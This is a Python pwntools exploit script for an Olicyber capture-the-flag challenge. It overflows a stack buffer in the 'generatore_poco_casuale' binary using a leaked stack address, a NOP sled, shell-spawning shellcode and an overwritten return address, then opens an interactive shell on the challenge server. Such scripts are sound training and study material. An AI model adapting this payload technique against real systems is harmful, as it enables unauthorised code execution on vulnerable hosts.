#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=gpc.challs.olicyber.it' '--port=10104' generatore_poco_casuale
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('generatore_poco_casuale')
# context.arch = "x86_64"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'gpc.challs.olicyber.it'
port = int(args.PORT or 10104)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

shellcode = shellcraft.sh()
i = 0
while(True):
    i+=1
    print(f'{i}esima volta')
    io = start()
    # info(f"shellcode len: {len(asm(shellcode))}")

    io.recvuntil(b'casuale: ')
    stack_pointer_add = int(io.recvline().decode())
    # info(f"stack pointer leaked: {hex(stack_pointer_add)}")

    # return address at rsp+336
    payload = flat(
        # 's' per continuare
        b's' * 16,
        #padding
        b'\x90' * (320-48),
        # cyclic(320),
        #shellcode    
        asm(shellcode),
        # rbp-0x20
        p64(stack_pointer_add + 8),
        #padding
        b'C' * 24,
        #base pointer
        p64(stack_pointer_add + 0x170),
        #return address
        p64(stack_pointer_add + 16),
    )

    io.sendlineafter(b'(s/n)', payload)
    # io.recvline()
    # response = io.recvline()
    # print(f'{response=}')
    # print(io.recvline())
    # if(b'fault' not in response and b'numero' not in io.recvline()):
    io.interactive()
    # else:
        # io.close()
        # sleep(0.1)
        # exit(0)
    


# io.interactive()

